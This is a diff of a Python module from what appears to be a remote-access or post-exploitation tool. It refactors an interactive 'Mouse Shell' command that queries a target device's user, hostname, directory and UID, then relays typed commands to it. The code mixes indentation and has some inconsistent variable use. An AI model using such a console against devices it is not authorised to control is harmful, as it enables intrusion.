@@ -6,23 +6,20 @@ class command:
     def __init__(self):
         self.name = "msh"
         self.description = "Open target device shell."
-	
-    def msh(self):
+    
+    def run(self,session,cmd_data):
 	os.system("printf '\033]2;Mouse Shell\a'")
+	username = session.send_command({"cmd":"whoami", "args":""})
+	hostname = session.send_command({"cmd":"hostname","args":""})
+	current_directory = session.send_command({"cmd":"pwd","args":""})
+	uid = session.send_command({"cmd":"echo","args":"$UID"})
 	if session.uid == "0":
 		whoami = "# "
 	else:
 		whoami = "$ "
-	return h.RED+username+"@"+hostname+h.WHITE+":"+current_directory+whoami
-    
-    def run(self,session,cmd_data):
-        username = session.send_command({"cmd":"whoami", "args":""})
-	hostname = session.send_command({"cmd":"hostname","args":""})
-	current_directory = session.send_command({"cmd":"pwd","args":""})
-	uid = session.send_command({"cmd":"echo","args":"$UID"})
 	while 1:
 	    #prepare command
-	    msh = raw_input(self.msh(session))
+	    msh = raw_input(h.RED+username+"@"+hostname+h.WHITE+":"+current_directory+whoami)
 	    if not msh or msh.replace(" ","") == "":
 	        continue
 	    mshd = msh.split()[0]
